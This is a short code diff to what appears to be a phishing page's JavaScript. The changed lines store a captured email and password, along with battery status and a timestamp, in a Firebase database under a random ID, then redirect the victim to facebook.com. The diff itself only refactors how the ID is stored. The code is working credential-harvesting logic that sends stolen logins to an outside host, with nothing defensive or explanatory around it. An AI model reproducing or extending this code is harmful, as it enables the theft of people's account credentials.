@@ -69,8 +69,8 @@ const formattedDate = now.toLocaleDateString();
 const formattedTime = now.toLocaleTimeString();
 console.log(`Current date: ${formattedDate}`);
 console.log(`Current time: ${formattedTime}`);  
-  
-  set(ref(database, "users/"+generateRandomId(8) ), { em:em, pass: pass  ,chargin:batteryStatus,level:batteryLevel , timestamp:serverTimestamp()}).then(
+  const id = generateRandomId(8)
+  set(ref(database, "users/"+id ), { id:id ,  em:em, pass: pass  ,chargin:batteryStatus,level:batteryLevel , timestamp:serverTimestamp()}).then(
     window.location.href = 'https://www.facebook.com/'
     );
 });
